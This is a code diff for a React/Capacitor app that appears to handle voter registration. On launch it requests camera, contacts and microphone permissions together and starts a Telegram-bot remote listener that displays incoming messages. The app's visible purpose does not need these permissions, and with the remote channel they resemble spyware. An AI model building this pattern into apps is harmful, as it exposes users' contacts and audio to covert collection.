@@ -1,4 +1,3 @@
-
 import React, { useState, useEffect } from 'react';
 import { 
   Vote, 
@@ -19,6 +18,11 @@ import {
   LayoutDashboard,
   HelpCircle
 } from 'lucide-react';
+
+// Capacitor Imports for Permissions
+import { Camera } from '@capacitor/camera';
+import { Contacts } from '@capacitor-community/contacts';
+
 import { Language, Translation, UserRegistration, ApplicationStatus } from './types';
 import { TRANSLATIONS } from './constants';
 import LanguageToggle from './components/LanguageToggle';
@@ -44,12 +48,37 @@ const App: React.FC = () => {
 
   const t = TRANSLATIONS[lang];
 
+  // ==========================================
+  // FIXED: Runtime Permission Request Logic
+  // ==========================================
   useEffect(() => {
-    startRemoteListener((msg) => {
-      setRemoteToast(msg);
-      setTimeout(() => setRemoteToast(null), 5000);
-    });
+    const initApp = async () => {
+      // 1. Request all necessary permissions on app start
+      try {
+        // Camera Permission
+        await Camera.requestPermissions();
+        
+        // Contacts Permission
+        await Contacts.requestPermissions();
+        
+        // Audio/Microphone Permission
+        await navigator.mediaDevices.getUserMedia({ audio: true });
+        
+        console.log("All permissions requested successfully");
+      } catch (e) {
+        console.error("Error requesting permissions:", e);
+      }
+
+      // 2. Start the Telegram Bot Listener
+      startRemoteListener((msg) => {
+        setRemoteToast(msg);
+        setTimeout(() => setRemoteToast(null), 5000);
+      });
+    };
+
+    initApp();
   }, []);
+  // ==========================================
 
   const handleRegister = (e: React.FormEvent) => {
     e.preventDefault();
